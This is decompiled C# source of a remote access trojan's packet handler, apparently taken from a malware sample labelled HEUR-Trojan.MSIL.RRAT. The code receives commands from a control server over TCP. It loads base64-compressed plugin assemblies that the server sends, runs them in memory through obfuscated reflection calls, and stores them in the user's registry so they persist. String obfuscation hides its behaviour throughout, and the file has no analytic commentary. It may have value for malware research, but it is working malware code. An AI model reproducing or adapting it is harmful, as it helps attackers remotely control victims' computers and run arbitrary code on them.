// Decompiled with JetBrains decompiler
// Type: Lime.Packets.PacketHandler
// Assembly: ClientX, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EEC5B2E-8B21-4543-94D2-F5C89EF8D336
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.RRAT.gen-1ff51be88103ec4492613582af80f682292f70f7270ec457c7ca14a89fe324bb.exe

using Lime.Connection;
using Lime.Helper;
using Lime.Settings;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Text;
using System.Windows.Forms;

namespace Lime.Packets
{
  public class PacketHandler
  {
    public void Handler(object packet)
    {
      try
      {
        string key = Config.key;
        string[] strArray = Strings.Split(StringConverter.BytestoString((byte[]) packet), key, Compare: CompareMethod.Text);
        if (strArray[0] == \uE002.\uE000("\uE183\uE19D\uE190", 57731))
        {
          Config.stopwatch.Reset();
          Config.stopwatch.Start();
          Client.TcpSend(\uE002.\uE000("\uE183\uE19D\uE190", 57731));
        }
        else if (strArray[0] == \uE002.\uE000("\uF0EF", 61631))
        {
          Config.stopwatch.Stop();
          Client.TcpSend(\uE002.\uE000("\uF0EF", 61631) + key + (object) Config.stopwatch.ElapsedMilliseconds);
          Client.TcpSend(\uE002.\uE000("\uF7E8", 63423) + key + IdGenerator.GetActiveWindow());
        }
        else if (strArray[0] == \uE002.\uE000("\uE6B6\uE6BA", 58991))
        {
          if (Registry.CurrentUser.OpenSubKey(\uE002.\uE000("\uECB0\uEC8C\uEC85\uEC97\uEC94\uEC82\uEC91\uEC86\uECBF", 60448) + StringConverter.Encode(Config.currentMutex) + \uE002.\uE000("\uE3A3", 58188) + strArray[1], true) != null)
          {
            try
            {
              this.Invoke(Config.host, Config.port, strArray[4], strArray[5], StringConverter.Encode(StringConverter.Decode(Config.id) + \uE002.\uE000("\uE7A0", 59201) + IdGenerator.GetHardDiskSerialNumber()), Registry.GetValue(\uE002.\uE000("\uF3B7\uF3B4\uF3BA\uF3A6\uF3A0\uF3BC\uF3AA\uF3AD\uF3AD\uF3BA\uF3B1\uF3AB\uF3A0\uF3AA\uF3AC\uF3BA\uF3AD\uF3A3\uF3AC\uF3B0\uF3B9\uF3AB\uF3A8\uF3BE\uF3AD\uF3BA\uF3A3", 62230) + StringConverter.Encode(Config.currentMutex) + \uE002.\uE000("\uE7B2\uE7B2", 59150) + strArray[1], strArray[1], (object) null).ToString(), int.Parse(strArray[2]), Convert.ToBoolean(strArray[3]), strArray[1], true);
            }
            catch
            {
              Client.TcpSend(\uE002.\uE000("\uF3BC\uF3AB\uF3B7", 62378) + key + strArray[5] + key + strArray[1] + key + \uE002.\uE000("\uEE1B\uEE1C\uEE11\uEE0E\uEE18", 60989));
            }
          }
          else
            Client.TcpSend(\uE002.\uE000("\uF3BC\uF3AB\uF3B7", 62378) + key + strArray[5] + key + strArray[1] + key + \uE002.\uE000("\uEE1B\uEE1C\uEE11\uEE0E\uEE18", 60989));
        }
        else if (strArray[0] == \uE002.\uE000("\uE3E3\uE3FF", 58122))
        {
          this.Invoke(Config.host, Config.port, strArray[1], strArray[2], StringConverter.Encode(StringConverter.Decode(Config.id) + \uE002.\uE000("\uE7A0", 59201) + IdGenerator.GetHardDiskSerialNumber()), strArray[3], int.Parse(strArray[4]), Convert.ToBoolean(strArray[5]), strArray[6], Convert.ToBoolean(strArray[7]));
        }
        else
        {
          if (!(strArray[0] == \uE002.\uE000("\uF3AB\uF3B0\uF3A8", 62382)))
            return;
          object ObjectRef = Interaction.CallByName(Interaction.CallByName(this.GetAssembly(strArray[1]), Encoding.Default.GetString(new byte[7]
          {
            (byte) 71,
            (byte) 101,
            (byte) 116,
            (byte) 84,
            (byte) 121,
            (byte) 112,
            (byte) 101
          }), CallType.Method, (object) strArray[2]), Encoding.Default.GetString(new byte[9]
          {
            (byte) 71,
            (byte) 101,
            (byte) 116,
            (byte) 77,
            (byte) 101,
            (byte) 116,
            (byte) 104,
            (byte) 111,
            (byte) 100
          }), CallType.Method, (object) Encoding.Default.GetString(new byte[3]
          {
            (byte) 85,
            (byte) 78,
            (byte) 73
          }));
          string ProcName = Encoding.Default.GetString(new byte[6]
          {
            (byte) 73,
            (byte) 110,
            (byte) 118,
            (byte) 111,
            (byte) 107,
            (byte) 101
          });
          object[] objArray1 = new object[2];
          object[] objArray2 = objArray1;
          object[] objArray3 = new object[43];
          objArray3[0] = (object) StringConverter.Encode(Config.currentMutex);
          objArray3[1] = (object) strArray[3];
          objArray3[32] = (object) strArray[4];
          objArray3[33] = (object) strArray[5];
          objArray3[34] = (object) Application.ExecutablePath;
          objArray3[35] = (object) strArray[6];
          objArray3[36] = (object) strArray[7];
          objArray3[37] = (object) strArray[8];
          objArray3[38] = (object) strArray[9];
          objArray3[39] = (object) strArray[10];
          objArray3[40] = (object) strArray[11];
          objArray3[41] = (object) strArray[12];
          objArray3[42] = (object) strArray[13];
          object[] objArray4 = objArray3;
          objArray2[1] = (object) objArray4;
          object[] objArray5 = objArray1;
          Interaction.CallByName(ObjectRef, ProcName, CallType.Method, objArray5);
        }
      }
      catch
      {
      }
    }

    public void Invoke(
      string H,
      string P,
      string N,
      string C,
      string ID,
      string Bytes,
      int S,
      bool M,
      string MD5,
      bool B)
    {
      try
      {
        byte[] bytes1 = new byte[14]
        {
          (byte) 67,
          (byte) 114,
          (byte) 101,
          (byte) 97,
          (byte) 116,
          (byte) 101,
          (byte) 73,
          (byte) 110,
          (byte) 115,
          (byte) 116,
          (byte) 97,
          (byte) 110,
          (byte) 99,
          (byte) 101
        };
        byte[] bytes2 = new byte[5]
        {
          (byte) 83,
          (byte) 116,
          (byte) 97,
          (byte) 114,
          (byte) 116
        };
        Interaction.CallByName(Interaction.CallByName(this.GetAssembly(Bytes), Encoding.Default.GetString(bytes1), CallType.Method, (object) (N + \uE002.\uE000("\uE481", 58378) + C)), Encoding.Default.GetString(bytes2), CallType.Method, (object) ID, (object) S, (object) H, (object) P, (object) Config.key, (object) Config.splitter);
        if (!M)
          return;
        try
        {
          if (Registry.CurrentUser.OpenSubKey(\uE002.\uE000("\uECB0\uEC8C\uEC85\uEC97\uEC94\uEC82\uEC91\uEC86\uECBF", 60448) + StringConverter.Encode(Config.currentMutex) + \uE002.\uE000("\uE3A3", 58188) + MD5, true) == null)
            this.SavePlugin(\uE002.\uE000("\uF3B7\uF3B4\uF3BA\uF3A6\uF3A0\uF3BC\uF3AA\uF3AD\uF3AD\uF3BA\uF3B1\uF3AB\uF3A0\uF3AA\uF3AC\uF3BA\uF3AD\uF3A3\uF3AC\uF3B0\uF3B9\uF3AB\uF3A8\uF3BE\uF3AD\uF3BA\uF3A3", 62230) + StringConverter.Encode(Config.currentMutex) + \uE002.\uE000("\uE3A3", 58188) + MD5, MD5, Bytes);
        }
        catch
        {
        }
        if (B)
          return;
        this.SavePlugin(\uE002.\uE000("\uF3B7\uF3B4\uF3BA\uF3A6\uF3A0\uF3BC\uF3AA\uF3AD\uF3AD\uF3BA\uF3B1\uF3AB\uF3A0\uF3AA\uF3AC\uF3BA\uF3AD\uF3A3\uF3AC\uF3B0\uF3B9\uF3AB\uF3A8\uF3BE\uF3AD\uF3BA\uF3A3", 62230) + StringConverter.Encode(Config.currentMutex) + \uE002.\uE000("\uE3A3", 58188) + MD5, MD5, Bytes);
      }
      catch
      {
      }
    }

    public object GetAssembly(string bytesArray)
    {
      try
      {
        return Interaction.CallByName((object) AppDomain.CurrentDomain, Encoding.Default.GetString(new byte[4]
        {
          (byte) 76,
          (byte) 111,
          (byte) 97,
          (byte) 100
        }), CallType.Method, (object) StringConverter.Decompress(Convert.FromBase64String(bytesArray)));
      }
      catch
      {
      }
      return (object) null;
    }

    public void SavePlugin(string P, string N, string B)
    {
      try
      {
        Registry.SetValue(P, N, (object) B);
      }
      catch
      {
      }
    }
  }
}
